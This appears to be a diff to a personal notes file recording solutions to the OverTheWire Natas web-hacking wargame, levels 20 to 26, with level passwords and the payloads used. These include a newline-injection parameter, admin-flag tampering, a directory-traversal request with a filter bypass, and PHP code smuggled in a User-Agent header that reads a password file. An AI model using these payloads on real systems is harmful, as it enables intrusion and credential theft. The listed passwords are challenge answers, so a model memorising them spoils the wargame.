@@ -69,3 +69,48 @@ http://natas19.natas.labs.overthewire.org/
 
 http://natas20.natas.labs.overthewire.org/
 eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF
+
+http://natas20.natas.labs.overthewire.org/index.php?name=asdf%0aadmin%201
+
+http://natas21.natas.labs.overthewire.org/
+IFekPyrQXftziDEsUr3x21sYuahypdgJ
+
+http://natas21-experimenter.natas.labs.overthewire.org/index.php?align=right&fontsize=100%25&bgcolor=yellow&submit=Update&debug=1&admin=1
+
+http://natas22.natas.labs.overthewire.org/
+chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ
+
+GET /?revelio=1 HTTP/1.1
+Host: natas22.natas.labs.overthewire.org
+Authorization: Basic bmF0YXMyMjpjaEc5ZmJlMVRxMmVXVk1nallZRDFNc2ZJdk40NjFrSg==
+
+http://natas23.natas.labs.overthewire.org/
+D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE
+
+http://natas23.natas.labs.overthewire.org/?passwd=111111111iloveyou
+
+http://natas24.natas.labs.overthewire.org/
+OsRmXFguozKpTZZ5X14zNO43379LZveg
+
+insert : OsRmXFguozKpTZZ5X14zNO43379LZveg
+
+
+http://natas25.natas.labs.overthewire.org/
+GHF6X7YwACaYYssHVY05cFq83hRktl4c
+
+
+GET /?lang=../..././..././..././..././..././..././tmp/natas25_1234.log HTTP/1.1
+Host: natas25.natas.labs.overthewire.org
+Proxy-Connection: keep-alive
+Cache-Control: max-age=0
+Authorization: Basic bmF0YXMyNTpHSEY2WDdZd0FDYVlZc3NIVlkwNWNGcTgzaFJrdGw0Yw==
+Upgrade-Insecure-Requests: 1
+User-Agent: <? echo system("cat /etc/natas_webpass/natas26") ?>
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Encoding: gzip, deflate, sdch
+Accept-Language: ko-KR,ko;q=0.8,en-US;q=0.6,en;q=0.4
+Cookie: __cfduid=d4c3959c378d39f34654ad6636fbffc611480700237; __utma=176859643.2027556906.1480700237.1480700237.1480700237.1; __utmz=176859643.1480700237.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); PHPSESSID=1234
+
+
+http://natas26.natas.labs.overthewire.org/
+oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T
